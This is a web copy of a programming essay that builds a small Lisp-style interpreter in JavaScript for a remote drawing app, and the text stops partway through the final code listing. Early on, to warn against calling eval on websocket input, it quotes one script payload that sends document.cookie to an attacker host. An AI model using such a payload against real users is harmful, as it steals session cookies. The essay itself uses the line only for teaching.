<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://stopa.io/post/265">Original</a>
    <h1>An Intuition for Lisp Syntax</h1>
    
    <div id="readability-page-1" class="page"><div><div><div><p><span><p>Every lisp hacker I ever met, myself included, thought that all those brackets in Lisp were off-putting and weird. At first, of course. Soon after we all came to the same epiphany: <em>lisp’s power lies in those brackets</em>! In this essay, we’ll go on a journey to that epiphany.</p><p>Say we were creating a program that let you draw stuff. If we wrote this in JavaScript, we might have functions like this:</p><pre><code><span>drawPoint</span><span>({x: </span><span>0</span><span>, y: </span><span>1</span><span>}, </span><span>&#39;yellow&#39;</span><span>)</span>
<span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>&#39;blue&#39;</span><span>)</span>
<span>drawCircle</span><span>(</span><span>point</span><span>, </span><span>radius</span><span>, </span><span>&#39;red&#39;</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span>
<span>...</span></code></pre><p>So far, so cool.</p><p>Now, here’s a challenge: <strong>Can we support remote drawing?</strong></p><p>This means that a user would be able to “send” instructions to your screen, and you would see their drawing come to life.</p><p>How could we do it?</p><p>Well, say we set up a websocket connection. We could receive instructions from the user like this: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>/* TODO */</span><span> </span>
<span>})</span></code></pre><p>To make it work off the bat, one option could be to take code strings as input:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> {</span>
<span>  </span><span>eval</span><span>(</span><span>data</span><span>)</span>
<span>})</span></code></pre><p>Now the user could send <code>&#34;drawLine({x: 0, y: 0}, {x: 1, y: 1}, &#39;red&#39;)&#34;</code> and bam: we’ll draw a line! </p><p>But…your spidey sense may already be tingling. What if the user was malicious and managed to send us an instruction like this:</p><pre><code><span>&#34;window.location=&#39;http://iwillp3wn.com?user_info=&#39; + document.cookie&#34;</span></code></pre><p>Uh oh…our cookie would get sent to iwillp3wn.com, and the malicious user would indeed pwn us. We can’t use eval; it’s too dangerous. </p><p>There lies our problem: we can’t use <code>eval</code>, but we need some way to receive arbitrary instructions.</p><p>Well, we could represent those instructions as JSON. We can map each JSON instruction to a special function, and that way we can control what runs. Here’s one way we can represent it:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>&#34;drawLine&#34;</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>&#34;blue&#34;</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>This JSON would translate to <code>drawLine({x: 0, y: 0}, {x: 1, y: 1},&#34;blue&#34;)</code></p><p>We could support this pretty simply. Here’s how our <code>onMessage</code> could look:</p><pre><code><span>webSocket</span><span>.onMessage</span><span>(</span><span>instruction</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>((</span><span>ins</span><span>) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>ins</span><span>.</span><span>functionName</span><span>](</span><span>...</span><span>ins</span><span>.</span><span>args</span><span>));</span>
<span>})</span></code></pre><p>That seems like it would work!</p><p>Let’s see if we can clean this up. Here’s our JSON:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>&#34;drawLine&#34;</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>&#34;blue&#34;</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>Well, since <em>every</em> instruction has a <code>functionName</code>, and an <code>args</code>, we don’t really need to spell that out. We <em>could</em> write it like this: </p><pre><code><span>{</span>
<span>  instructions: [[</span><span>&#34;drawLine&#34;</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>&#34;blue&#34;</span><span>]],</span>
<span>}</span></code></pre><p>Nice! We changed our object in favor of an array. To handle that, all we need is a rule: <strong>the</strong> <strong><em>first</em></strong> <strong>part of our instruction is the function name, and the <em>rest</em> are arguments.</strong> If we wrote that down, here’s how our <code>onMessage</code> would look: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>(([</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>]) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>));</span>
<span>})</span></code></pre><p>And bam, <code>drawLine</code> would work again!</p><p>So far, we only used <code>drawLine</code>:</p><pre><code><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>&#39;blue&#39;</span><span>)</span>
<span>// same as</span>
<span>[</span><span>&#34;drawLine&#34;</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]</span></code></pre><p>But what if we wanted to express something more powerful:</p><pre><code><span>rotate</span><span>(</span><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>&#39;blue&#39;</span><span>), </span><span>90</span><span>)</span></code></pre><p>Looking at that, we can translate it to an instruction like this:</p><pre><code><span>[</span><span>&#34;rotate&#34;</span><span>, [</span><span>&#34;drawLine&#34;</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]</span></code></pre><p>Here, the <code>rotate</code> instruction has an argument that is in <em>itself</em> an instruction! Pretty powerful. Surprisingly, we just need to tweak our code a tiny bit to make it work:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>if</span><span> (</span><span>!</span><span>Array</span><span>.isArray</span><span>(</span><span>ins</span><span>)) {</span>
<span>      </span><span>// this must be a primitive argument, like {x: 0, y: 0}</span>
<span>      </span><span>return</span><span> </span><span>ins</span><span>;</span>
<span>    }</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>return</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>.map</span><span>(</span><span>parseInstruction</span><span>));</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>(</span><span>parseInstruction</span><span>);</span>
<span>})</span></code></pre><p>Nice, We introduce a <code>parseInstruction</code> function. We can apply <code>parseInstruction</code> recursively to arguments, and support stuff like:</p><pre><code><span>[</span><span>&#34;rotate&#34;</span><span>, [</span><span>&#34;rotate&#34;</span><span>, [</span><span>&#34;drawLine&#34;</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>], </span><span>30</span><span>]</span></code></pre><p>Very cool!</p><p>Okay, let’s look at our JSON again:</p><pre><code><span>{</span>
<span>  instructions: [[</span><span>&#34;drawLine&#34;</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]],</span>
<span>}</span></code></pre><p>Well, our data <em>only</em> contains instructions. Do we really need a key called <code>instructions</code>? </p><p>What if we did this: </p><pre><code><span>[</span><span>&#34;do&#34;</span><span>, [</span><span>&#34;drawLine&#34;</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]]</span></code></pre><p>Instead of a top-level key, we could have a special instruction called <code>do</code>, which runs all the instructions it’s given.</p><p>Here’s one way we can implement it:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    </span><span>...</span>
<span>    </span><span>do</span><span>: (</span><span>...</span><span>args</span><span>) </span><span>=&gt;</span><span> </span><span>args</span><span>[</span><span>args</span><span>.length </span><span>-</span><span> </span><span>1</span><span>],</span>
<span>  };</span>
<span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>if</span><span> (</span><span>!</span><span>Array</span><span>.isArray</span><span>(</span><span>ins</span><span>)) {</span>
<span>      </span><span>// this must be a primitive argument, like {x: 0, y: 0}</span>
<span>      </span><span>return</span><span> </span><span>ins</span><span>;</span>
<span>    }</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>return</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>.map</span><span>(</span><span>parseInstruction</span><span>));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>);</span>
<span>})</span></code></pre><p>Oh wow, that was easy. We just added <code>do</code> in <code>fns</code>. Now we can support an instruction like this:</p><pre><code><span>[</span>
<span>  </span><span>&#34;do&#34;</span><span>,</span>
<span>  [</span><span>&#34;drawPoint&#34;</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }],</span>
<span>  [</span><span>&#34;rotate&#34;</span><span>, [</span><span>&#34;drawLine&#34;</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]],</span>
<span>];</span></code></pre><p>Let’s make it more interesting. What if we wanted to support <em>definitions?</em></p><pre><code><span>const</span><span> </span><span>shape</span><span> </span><span>=</span><span> </span><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>&#39;red&#39;</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span></code></pre><p>If we could support definitions, our remote user could write some very expressive instructions! Let’s convert our code to the kind of data structure we’ve been playing with:</p><pre><code><span>[</span><span>&#34;def&#34;</span><span>, </span><span>&#34;shape&#34;</span><span>, [</span><span>&#34;drawLine&#34;</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]]</span>
<span>[</span><span>&#34;rotate&#34;</span><span>, </span><span>&#34;shape&#34;</span><span>, </span><span>90</span><span>]</span></code></pre><p>Noot bad! If we can support an instruction like that, we’d be golden! Here’s how: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>variables</span><span> </span><span>=</span><span> {};</span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    </span><span>...</span>
<span>    </span><span>def</span><span>: (</span><span>name</span><span>, </span><span>v</span><span>) </span><span>=&gt;</span><span> {</span>
<span>      </span><span>variables</span><span>[</span><span>name</span><span>] </span><span>=</span><span> </span><span>v</span><span>;</span>
<span>    },</span>
<span>  };</span>
<span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>if</span><span> (</span><span>variables</span><span>[</span><span>ins</span><span>]) {</span>
<span>      </span><span>// this must be some kind of variable, like &#34;shape&#34;</span>
<span>      </span><span>return</span><span> </span><span>variables</span><span>[</span><span>ins</span><span>];</span>
<span>    }</span>
<span>    </span><span>if</span><span> (</span><span>!</span><span>Array</span><span>.isArray</span><span>(</span><span>ins</span><span>)) {</span>
<span>      </span><span>// this must be a primitive argument, like {x: 0, y: 0}</span>
<span>      </span><span>return</span><span> </span><span>ins</span><span>;</span>
<span>    }</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>return</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>.map</span><span>(</span><span>parseInstruction</span><span>));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>);</span>
<span>})</span></code></pre><p>Here, we introduced a <code>variables</code> object, which keeps track of every variable we define.  A special <code>def</code> function updates that <code>variables</code> object. Now we can run this instruction: </p><pre><code><span>[</span>
<span>  </span><span>&#34;do&#34;</span><span>,</span>
<span>  [</span><span>&#34;def&#34;</span><span>, </span><span>&#34;shape&#34;</span><span>, [</span><span>&#34;drawLine&#34;</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]],</span>
<span>  [</span><span>&#34;rotate&#34;</span><span>, </span><span>&#34;shape&#34;</span><span>, </span><span>90</span><span>],</span>
<span>];</span></code></pre><p>Not bad!</p><p>Let’s step it up a notch. What if we let our remote user <em>define their own functions?</em> </p><p>Say they wanted to write something like this:</p><pre><code><span>const</span><span> </span><span>drawTriangle</span><span> </span><span>=</span><span> </span><span>function</span><span>(</span><span>left</span><span>, </span><span>top</span><span>, </span><span>right</span><span>, </span><span>color</span><span>) { </span>
<span>   </span><span>drawLine</span><span>(</span><span>left</span><span>, </span><span>top</span><span>, </span><span>color</span><span>);</span>
<span>   </span><span>drawLine</span><span>(</span><span>top</span><span>, </span><span>right</span><span>, </span><span>color</span><span>); </span>
<span>   </span><span>drawLine</span><span>(</span><span>left</span><span>, </span><span>right</span><span>, </span><span>color</span><span>); </span>
<span>} </span>
<span>drawTriangle</span><span>(</span><span>...</span><span>)</span></code></pre><p>How would we do it? Let’s follow our intuition again. If we transcribe this to our data representation, here’s how it could look:</p><pre><code><span>  [</span><span>&#34;def&#34;</span><span>, </span><span>&#34;drawTriangle&#34;</span><span>,</span>
<span>  [</span><span>&#34;fn&#34;</span><span>, [</span><span>&#34;left&#34;</span><span>, </span><span>&#34;top&#34;</span><span>, </span><span>&#34;right&#34;</span><span>, </span><span>&#34;color&#34;</span><span>],</span>
<span>    [</span><span>&#34;do&#34;</span><span>,</span>
<span>      [</span><span>&#34;drawLine&#34;</span><span>, </span><span>&#34;left&#34;</span><span>, </span><span>&#34;top&#34;</span><span>, </span><span>&#34;color&#34;</span><span>],</span>
<span>      [</span><span>&#34;drawLine&#34;</span><span>, </span><span>&#34;top&#34;</span><span>, </span><span>&#34;right&#34;</span><span>, </span><span>&#34;color&#34;</span><span>],</span>
<span>      [</span><span>&#34;drawLine&#34;</span><span>, </span><span>&#34;left&#34;</span><span>, </span><span>&#34;right&#34;</span><span>, </span><span>&#34;color&#34;</span><span>],</span>
<span>    ],</span>
<span>  ],</span>
<span>],</span>
<span>[</span><span>&#34;drawTriangle&#34;</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>&#34;blue&#34;</span><span>],</span></code></pre><p>Here, </p><pre><code><span>const</span><span> </span><span>drawTriangle</span><span> </span><span>=</span><span> </span><span>...</span></code></pre><p>translates to </p><pre><code><span>[</span><span>&#34;def&#34;</span><span>, </span><span>&#34;drawTriangle&#34;</span><span>, …]. </span></code></pre><p>And</p><pre><code><span>function</span><span>(</span><span>left</span><span>, </span><span>top</span><span>, </span><span>right</span><span>, </span><span>color</span><span>) {…}</span></code></pre><p>translates to </p><pre><code><span>[</span><span>&#34;fn&#34;</span><span>, [</span><span>&#34;left&#34;</span><span>, </span><span>&#34;top&#34;</span><span>, </span><span>&#34;right&#34;</span><span>, </span><span>&#34;color&#34;</span><span>], [</span><span>&#34;do&#34;</span><span> </span><span>...</span><span>]]</span></code></pre><p>All we need to do is to parse this instruction somehow, and bam, we are good to go!</p><p>The key to making this work is our <code>[&#34;fn&#34;, …]</code> instruction. What if we did this:</p><pre><code><span>const</span><span> </span><span>parseFnInstruction</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>body</span><span>, </span><span>oldVariables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>  </span><span>return</span><span> (</span><span>...</span><span>values</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span>
<span>      </span><span>...</span><span>oldVariables</span><span>,</span>
<span>      </span><span>...</span><span>mapArgsWithValues</span><span>(</span><span>args</span><span>, </span><span>values</span><span>),</span>
<span>    };</span>
<span>    </span><span>return</span><span> </span><span>parseInstruction</span><span>(</span><span>body</span><span>, </span><span>newVariables</span><span>);</span>
<span>  };</span>
<span>};</span></code></pre><p>When we find a <code>fn</code>  instruction, we run <code>parseFnInstruction</code>. This produces a new javascript function. We would replace <code>drawTriangle</code> here with that function:</p><pre><code><span>[</span><span>&#34;drawTriangle&#34;</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>&#34;blue&#34;</span><span>]</span></code></pre><p>So when that function is run, <code>values</code> would become:</p><pre><code><span>[{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>&#34;blue&#34;</span><span>]</span></code></pre><p>After that, </p><pre><code><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span><span>...</span><span>oldVariables</span><span>, </span><span>...</span><span>mapArgsWithValues</span><span>(</span><span>args</span><span>, </span><span>values</span><span>)}</span></code></pre><p>Would create a new <code>variables</code> object, that includes a mapping of the function arguments to these newly provided values:</p><pre><code><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span>
<span>  </span><span>...</span><span>oldVariables</span><span>,</span>
<span>  left: { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, </span>
<span>  top: { x: </span><span>3</span><span>, y: </span><span>3</span><span> },</span>
<span>  right: {x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span>
<span>  color: </span><span>&#34;blue&#34;</span><span>, </span>
<span>}</span></code></pre><p>Then, we can take the function body, in this case: </p><pre><code><span>      [</span>
<span>        </span><span>&#34;do&#34;</span><span>,</span>
<span>        [</span><span>&#34;drawLine&#34;</span><span>, </span><span>&#34;left&#34;</span><span>, </span><span>&#34;top&#34;</span><span>, </span><span>&#34;color&#34;</span><span>],</span>
<span>        [</span><span>&#34;drawLine&#34;</span><span>, </span><span>&#34;top&#34;</span><span>, </span><span>&#34;right&#34;</span><span>, </span><span>&#34;color&#34;</span><span>],</span>
<span>        [</span><span>&#34;drawLine&#34;</span><span>, </span><span>&#34;left&#34;</span><span>, </span><span>&#34;right&#34;</span><span>, </span><span>&#34;color&#34;</span><span>],</span>
<span>      ],</span></code></pre><p>And run it through <code>parseInstruction</code>, with our <code>newVariables</code>. With that <code>&#34;left&#34;</code> would be looked up as a variable and map to <code>{x: 0, y: 0}</code>. </p><p>If we did that, voila, the major work to support functions would be done!</p><p>Let’s follow through on our plan. The first thing we need to do, is to have <code>parseInstruction</code> accept <code>variables</code> as an argument. To do that, we need to update <code>parseInstruction</code>, and wherever it&#39;s called:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>...</span>
<span>    </span><span>return</span><span> </span><span>fn</span><span>(</span><span>...</span><span>args</span><span>.map</span><span>((</span><span>arg</span><span>) </span><span>=&gt;</span><span> </span><span>parseInstruction</span><span>(</span><span>arg</span><span>, </span><span>variables</span><span>)));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>, </span><span>variables</span><span>);</span></code></pre><p>Next, we’ll want to add a special check to detect if we have a “fn” instruction:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>...</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>if</span><span> (</span><span>fName</span><span> </span><span>==</span><span> </span><span>&#34;fn&#34;</span><span>) {</span>
<span>      </span><span>return</span><span> </span><span>parseFnInstruction</span><span>(</span><span>...</span><span>args</span><span>, </span><span>variables</span><span>);</span>
<span>    }</span>
<span>    </span><span>...</span>
<span>    </span><span>return</span><span> </span><span>fn</span><span>(</span><span>...</span><span>args</span><span>.map</span><span>((</span><span>arg</span><span>) </span><span>=&gt;</span><span> </span><span>parseInstruction</span><span>(</span><span>arg</span><span>, </span><span>variables</span><span>)));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>, </span><span>variables</span><span>);</span></code></pre><p>Now, our <code>parseFnInstruction</code>: </p><pre><code><span>const</span><span> </span><span>mapArgsWithValues</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>values</span><span>) </span><span>=&gt;</span><span> { </span>
<span>  </span><span>return</span><span> </span><span>args</span><span>.reduce</span><span>((</span><span>res</span><span>, </span><span>k</span><span>, </span><span>idx</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>res</span><span>[</span><span>k</span><span>] </span><span>=</span><span> </span><span>values</span><span>[</span><span>idx</span><span>];</span>
<span>    </span><span>return</span><span> </span><span>res</span><span>;</span>
<span>  }, {});</span>
<span>}</span>
<span>const</span><span> </span><span>parseFnInstruction</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>body</span><span>, </span><span>oldVariables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>  </span><span>return</span><span> (</span><span>...</span><span>values</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span><span>...</span><span>oldVariables</span><span>, </span><span>...</span><span>mapArgsWithValues</span><span>(</span><span>args</span><span>, </span><span>values</span><span>)}</span>
<span>    </span><span>return</span><span> </span><span>parseInstruction</span><span>(</span><span>body</span><span>, </span><span>newVariables</span><span>);</span>
<span>  };</span>
<span>};</span></code></pre><p>It works exactly like we said. We return a new function. When it’s run, it: </p><ol><li>Creates a <code>newVariables</code> object, that associates the <code>args</code> with <code>values</code></li><li>runs <code>parseInstruction</code> with the <code>body</code>  and the new <code>variables</code> object</li></ol><p>Okay, almost done. The final bit to make it all work:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>...</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>if</span><span> (</span><span>fName</span><span> </span><span>==</span><span> </span><span>&#34;fn&#34;</span><span>) {</span>
<span>      </span><span>return</span><span> </span><span>parseFnInstruction</span><span>(</span><span>...</span><span>args</span><span>, </span><span>variables</span><span>);</span>
<span>    }</span>
<span>    </span><span>const</span><span> </span><span>fn</span><span> </span><span>=</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>] </span><span>||</span><span> </span><span>variables</span><span>[</span><span>fName</span><span>];</span>
<span>    </span><span>return</span><span> </span><span>fn</span><span>(</span><span>...</span><span>args</span><span>.map</span><span>((</span><span>arg</span><span>) </span><span>=&gt;</span><span> </span><span>parseInstruction</span><span>(</span><span>arg</span><span>, </span><span>variables</span><span>)));</span></code></pre><p>The secret is this:</p><pre><code><span>    </span><span>const</span><span> </span><span>fn</span><span> </span><span>=</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>] </span><span>||</span><span> </span><span>variables</span><span>[</span><span>fName</span><span>];</span></code></pre><p>Here, since <code>fn</code> can now come from both <code>fns</code> and <code>variables</code>, we check both.  Put it all together, and it works!</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>variables</span><span> </span><span>=</span><span> {};</span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    drawPoint: </span><span>drawPoint</span><span>,</span>
<span>    rotate: </span><span>rotate</span><span>,</span>
<span>    </span><span>do</span><span>: (</span><span>...</span><span>args</span><span>) </span><span>=&gt;</span><span> </span><span>args</span><span>[</span><span>args</span><span>.length </span><span>-</span><span> </span><span>1</span><span>],</span>
<span>    </span><span>def</span><span>: (</span><span>name</span><span>, </span><span>v</span><span>) </span><span>=&gt;</span><span> {</span>
<span>      </span><span>variables</span><span>[</span><span>name</span><span>] </span><span>=</span><span> </span><span>v</span><span>;</span>
<span>    },</span>
<span>  };</span>
<span>  </span><span>const</span><span> </span><span>mapArgsWithValues</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>values</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>return</span><span> </span><span>args</span><span>.reduce</span><span>((</span><span>res</span><span>, </span><span>k</span><span>, </span><span>idx</span><span>) </span><span>=&gt;</span><span> {</span>
<span>      </span><span>res</span><span>[</span><span>k</span><span>] </span><span>=</span><span> </span><span>values</span><span>[</span><span>idx</span><span>];</span>
<span>      </span><span>return</span><span> </span><span>res</span><span>;</span>
<span>    }, {});</span>
<span>  };</span>
<span>  </span><span>const</span><span> </span><span>parseFnInstruction</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>body</span><span>, </span><span>oldVariables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>return</span><span> (</span><span>...</span><span>values</span><span>) </span><span>=&gt;</span><span> {</span>
<span>      </span><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span>
<span>        </span><span>...</span><span>oldVariables</span><span>,</span>
<span>        </span><span>...</span><span>mapArgsWithValues</span><span>(</span><span>args</span><span>, </span><span>values</span><span>),</span>
<span>      };</span>
<span>      </span><span>return</span><span> </span><span>parseInstruction</span><span>(</span><span>body</span><span>, </span><span>newVariables</span><span>);</span>
<span>    };</span>
<span>  };</span>
<span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>if</span><span> (</span><span>variables</span><span>[</span><span>ins</span><span>]) {</span>
<span>      </span><span>// this must be some kind of variable</span>
<span>      </span><span>return</span><span> </span><span>variables</span><span>[</span><span>ins</span><span>];</span>
<span>    }</span>
<span>    </span><span>if</span><span> (</span><span>!</span><span>Array</span><span>.isArray</span><span>(</span><span>ins</span><span>)) {</span>
<span>      </span><span>// this must be a primitive argument, like {x: 0, y: 0}</span>
<span>      </span><span>return</span><span> </span><span>ins</span><span>;</span>
<span>    }</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>if</span><span> (</span><span>fName</span><span> </span><span>==</span><span> </span><span>&#34;fn&#34;</span><span>) {</span>
<span>      </span><span>return</span><span> </span><span>parseFnInstruction</span><span>(</span><span>...</span><span>args</span><span>, </span><span>variables</span><span>);</span>
<span>    }</span>
<span>    </span><span>const</span><span> </span><span>fn</span><span> </span><span>=</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>] </span><span>||</span><span> </span><span>variables</span><span>[</span><span>fName</span><span>];</span>
<span>    </span><span>return</span><span> </span><span>fn</span><span>(</span><span>...</span><span>args</span><span>.map</span><span>((</span><span>arg</span><span>) </span><span>=&gt;</span><span> </span><span>parseInstruction</span><span>(</span><span>arg</span><span>, </span><span>variables</span><span>)));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>, </span><span>variables</span><span>);</span>
